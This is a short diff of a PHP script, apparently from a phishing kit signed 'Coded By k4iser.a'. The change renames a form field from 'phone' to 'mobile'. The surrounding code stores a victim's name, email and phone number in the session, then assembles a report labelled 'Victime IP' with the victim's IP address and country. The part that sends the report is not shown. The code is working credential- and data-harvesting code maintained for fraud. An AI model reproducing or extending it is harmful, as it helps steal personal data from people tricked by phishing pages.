@@ -3,14 +3,14 @@ session_start();
 
 $name=$_POST["name"];
 $email=$_POST["email"];
-$phone=$_POST["phone"];
+$mobile=$_POST["mobile"];
 
 $rand=rand(1000000,999999999).rand(1000000,999999999);
 
 
         $_SESSION['name'] = $name;
         $_SESSION['email'] = $email;
-        $_SESSION['phone'] = $phone;
+        $_SESSION['mobile'] = $mobile;
 
 		
         
@@ -41,7 +41,7 @@ $message .= "~ Coded By k4iser.a  ~\n";
 $message .= "|----------|Details ZA |----------|\n";
 $message .= "Name  : ".$_SESSION['name']."\n";
 $message .= "Email  : ".$_SESSION['email']."\n";
-$message .= "Phone Number  : ".$_SESSION['phone']."\n";
+$message .= "Phone Number  : ".$_SESSION['mobile']."\n";
 $message .= "
 ----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
 Victime IP: $ip | COUNTRY : $ipdat->geoplugin_countryName .
